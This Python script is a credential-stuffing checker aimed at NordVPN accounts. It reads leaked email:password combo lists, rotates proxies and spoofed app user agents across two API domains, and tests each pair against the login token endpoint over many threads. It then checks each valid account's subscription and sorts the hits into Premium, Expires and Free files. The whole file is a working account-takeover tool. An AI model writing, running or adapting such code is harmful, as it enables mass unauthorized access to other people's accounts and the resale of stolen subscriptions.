import requests
import os
import re
from colorama import Fore, init
import ctypes
from multiprocessing.dummy import Pool
import json
import datetime
import itertools
import argparse
import base64
import random
import time
import ciso8601
import threading

init()


user_agents = ['NordApp android (playstore/4.1.3) Android 5.1',
               'NordApp android (playstore/4.1.3) Android 6.0',
               'NordApp android (playstore/4.1.3) Android 7.1',
               'NordApp android (playstore/4.1.3) Android 8.0',
               'NordApp android (playstore/4.1.3) Android 9.0',
               'NordApp android (playstore/4.1.3) Android 10.0',
               'NordApp android (playstore/4.1.3) Android 4.2.2',
               'NordApp android (playstore/4.1.3) Android 4.4.2',
               'NordApp android (playstore/4.1.3) Android 5.1.1']


domains = ['zwyr157wwiu6eior.com', 'api.nordvpn.com']


class ErrorCaptcha(Exception):
    pass





class Checker:
    def __init__(
            self,
            proxy_loaction,
            combo_location,
            proxy_type,
            sort=True,
            print_result=False
            ):
        self.date = datetime.datetime.now().strftime("%d.%m.%Y %H-%M-%S")
        self.proxy_l = proxy_loaction
        self.combo_l = combo_location
        self.combo_list = []
        self.sort = sort
        self.print_result = print_result
        self.proxy_type = proxy_type
        os.mkdir(self.date)
        self.filename_premium = open(f'./{self.date}/Premium.txt', 'a')
        self.filename_bads = open(f'./{self.date}/Bads.txt', 'a')
        self.filename_errors = open(f'./{self.date}/Errors.txt', 'a')
        self.filename_expires = open(f'./{self.date}/Expires.txt', 'a')
        self.filename_free = open(f'./{self.date}/Free.txt', 'a')
        self.bad = 0
        self.premium = 0
        self.expires = 0
        self.free = 0
        self.captcha = 0
        self.connection_error = 0
        self.loaded = 0
        self.errors = 0
        self.proxies = 0
        self.checked = 0


    def success(self, res):
        self.premium += 1
        self.checked += 1
        self.filename_premium.write(res)
        self.filename_premium.flush()
        if self.print_result:
            print(Fore.LIGHTGREEN_EX + res)
        if self.sort:
            with open('./{}/{}.txt'.format(self.date, re.search(r'(\d{4})\-\d{2}\-\d{2}', res).group(1)), 'a') as f:
                f.write(res)

    def failed(self, user, pwd):
        self.checked += 1
        self.bad += 1
        self.filename_bads.write(f'{user}:{pwd}\n')
        self.filename_bads.flush()

    def expires_sub(self, res):
        self.checked += 1
        self.expires += 1
        self.filename_expires.write(res)
        self.filename_expires.flush()

    def error(self, res):
        self.checked += 1
        self.errors += 1
        self.filename_errors.write(res)
        self.filename_errors.flush()
    
    def free_sub(self, res):
        self.checked += 1
        self.free += 1
        self.filename_free.write(res)
        self.filename_free.flush()
    
    def setConsoleTitle(self):
        ctypes.windll.kernel32.SetConsoleTitleW(
            f" Checked: {self.checked}/{self.loaded} Bad: {self.bad} Premium: {self.premium} Expires: {self.expires} Free: {self.free} Error: {self.errors} Captcha: {self.captcha} Conn Error: {self.connection_error}")


    def checker_main(self, email, pwd):
        while True:
            domain = random.choice(domains)
            headers = {'User-Agent': random.choice(user_agents)}
            proxy = next(self.gen_proxies)
            try:
                r = requests.post(f'https://{domain}/v1/users/tokens',
                                headers=headers,
                                data={'username': email, 'password': pwd},
                                proxies={'https': f'{self.proxy_type}://{proxy}'})
            except KeyboardInterrupt:
                return
            except requests.exceptions.ConnectionError:
                self.connection_error += 1
                self.setConsoleTitle()
                continue
            except requests.exceptions.InvalidProxyURL:
                self.connection_error += 1
                self.setConsoleTitle()
                continue
            except requests.exceptions.ChunkedEncodingError:
                self.connection_error += 1
                self.setConsoleTitle()
                continue
            if r.status_code not in (201, 401):
                self.captcha += 1
                self.setConsoleTitle()
                continue
            elif r.status_code == 401:
                self.failed(email, pwd)
                self.setConsoleTitle()
            elif r.status_code == 201:
                token = r.json()['token']
                while True:
                    try:
                        #with open('debug.txt', 'a') as f:
                        #    f.write(f'TOKEN{r.status_code}{r.text}{email}:{pwd}\n')
                        r = requests.get(f'https://{domain}/v1/users/services',
                                        headers=headers,
                                        auth=('token', token),
                                        proxies={'https': f'{self.proxy_type}://{proxy}'})
                    except KeyboardInterrupt:
                        return
                    except requests.exceptions.ConnectionError:
                        proxy = next(self.gen_proxies)
                        self.connection_error += 1
                        self.setConsoleTitle()
                        continue
                    except requests.exceptions.InvalidProxyURL:
                        proxy = next(self.gen_proxies)
                        self.connection_error += 1
                        self.setConsoleTitle()
                        continue
                    except requests.exceptions.ChunkedEncodingError:
                        proxy = next(self.gen_proxies)
                        self.connection_error += 1
                        self.setConsoleTitle()
                        continue
                    if r.status_code != 200:
                        proxy = next(self.gen_proxies)
                        self.captcha += 1
                        self.setConsoleTitle()
                        continue
                    #with open('debug.txt', 'a') as f:
                    #    f.write(f'STATUS{r.status_code}{r.text}\n')
                    res = r.json()
                    if res == []:
                        self.free_sub(f'{email}:{pwd}\n')
                        self.setConsoleTitle()
                        return
                    expires_at_ts = time.mktime(
                        ciso8601.parse_datetime(
                            res[0]['expires_at']).timetuple())
                    if expires_at_ts < time.time():
                        self.expires_sub(f'{email}:{pwd} | {res[0]["expires_at"]}\n')
                        self.setConsoleTitle()
                        return
                    self.success(f'{email}:{pwd} | {res[0]["expires_at"]}\n')
                    self.setConsoleTitle()
                    return
            else:
                print(f'{r.text} {r.status_code} {email}:{pwd} {proxy}')
            break

    def combo_loader(self):
        _combo_ = open(self.combo_l, "r").read()
        combos = re.findall(
            r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+:[\w\-.%$#!?@^!*]+',
            _combo_)
        self.loaded += len(combos)
        for item in combos:
            new_items = item.split(":")
            self.combo_list.append({"username": new_items[0],
                                    "pwd": new_items[1]})

    def proxy_machine(self):
        prox = open(self.proxy_l, "r").readlines()
        cleaned_prox = [items.rstrip() for items in prox]
        self.gen_proxies = itertools.cycle(cleaned_prox)

    def sender(self, list_accounts):
        username = list_accounts["username"]
        pwd = list_accounts["pwd"]
        self.checker_main(username, pwd)


    def start_threads(self, threads):
        self.combo_loader()
        self.threads = threads
        self.proxy_machine()
        pool = Pool(self.threads)
        try:
            for _ in pool.imap_unordered(self.sender, self.combo_list):
                pass
        except KeyboardInterrupt:
            exit(0)
        print("Done!")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-b', '--base', help="Base for brute", required=True)
    parser.add_argument(
        '-p',
        '--proxies',
        help="Proxies for brute",
        required=True)
    parser.add_argument(
        '-t',
        '--threads',
        help="Threads",
        default=150,
        type=int)
    parser.add_argument(
        '-s',
        '--sort',
        help="Sort subscribes by year",
        default=True,
        type=bool)
    parser.add_argument(
        '-pg',
        '--print_goods',
        help="Print goods",
        default=False,
        type=bool)
    parser.add_argument(
        '-pt',
        '--proxy_type',
        help="Proxy type (https/socks4/socks5)",
        choices=['https', 'socks4', 'socks5'],
        required=True)
    args = vars(parser.parse_args())
    Checker(
        args['proxies'],
        args['base'],
        args['proxy_type'],
        args['sort'],
        args['print_goods']
        ).start_threads(
        args['threads'])
